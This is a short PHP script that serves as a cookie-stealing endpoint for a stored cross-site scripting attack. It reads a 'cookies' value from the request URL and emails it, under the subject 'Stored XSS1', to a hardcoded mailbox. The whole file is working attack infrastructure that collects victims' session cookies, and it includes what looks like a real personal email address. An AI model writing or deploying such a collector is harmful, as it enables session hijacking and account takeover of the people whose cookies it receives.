<?php
 
$message = $_GET["cookies"];
 
mail('brunoapps@hotmail.fr', 'Stored XSS1', $message);
 
?>
